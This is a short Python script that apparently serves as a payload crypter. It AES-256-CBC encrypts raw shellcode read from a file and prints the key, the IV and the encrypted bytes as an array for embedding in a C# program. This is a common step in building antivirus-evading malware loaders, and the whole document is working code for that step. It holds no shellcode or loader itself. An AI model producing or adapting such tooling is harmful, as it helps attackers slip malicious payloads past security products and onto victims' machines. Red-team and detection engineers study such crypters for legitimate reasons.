from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# Generate AES key and IV (256-bit key and 128-bit IV)
aes_key = os.urandom(32)  # 32 bytes = 256 bits
aes_iv = os.urandom(16)   # 16 bytes = 128 bits

print("AES Key:", aes_key.hex())
print("AES IV:", aes_iv.hex())

# Read shellcode from file
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# Pad the shellcode to make it a multiple of the block size (16 bytes for AES)
padding_length = 16 - (len(shellcode) % 16)
shellcode += bytes([padding_length] * padding_length)

# Encrypt the shellcode
cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
encryptor = cipher.encryptor()
encrypted_shellcode = encryptor.update(shellcode) + encryptor.finalize()

# Save encrypted shellcode to a file or convert it to a byte array for embedding in C#
print(", ".join([f"0x{b:02x}" for b in encrypted_shellcode]))

